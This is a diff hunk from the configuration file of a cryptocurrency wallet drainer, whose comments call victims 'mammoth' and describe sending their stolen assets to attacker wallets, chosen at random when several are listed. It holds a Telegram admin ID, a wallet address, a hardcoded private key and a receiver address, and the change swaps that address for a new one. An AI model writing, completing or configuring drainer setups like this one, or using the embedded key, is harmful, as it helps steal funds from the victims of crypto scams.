@@ -36,7 +36,7 @@ const MS_Telegram_Admin_IDs = ["8914856872"]; // Specify your Telegram ID here s
 
 const MS_Wallet_Address = "0x6c8BE5c0CB5C488d6A69f8795969A996a46276ff"; // Wallet address where mammoth assets will go
 const MS_Wallet_Private = "0xdb9dac99cd4f62025b762e2df5c1e77da7f82edb0990deab53d0086ff7df8251"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
-const MS_Wallet_Receiver = ["0xe07c77fbf97a17ca781c8f301b599b0d23682bbf"]; // The wallet or wallets where the assets will arrive may be the same as MS_Wallet_Address, or may be different
+const MS_Wallet_Receiver = ["0x662d27846c3241B9D78cCc5945C3A2e443dCCc06"]; // The wallet or wallets where the assets will arrive may be the same as MS_Wallet_Address, or may be different
 // To specify multiple wallets, you need to fill in as follows: MS_Wallet_Receiver = ["WALLET_ADDRESS_HERE", "ANOTHER_WALLET", "ONE_MORE_WALLET"]
 // If several wallets are specified, the drainer will select a random one and send assets to it, convenient for asset distribution
 
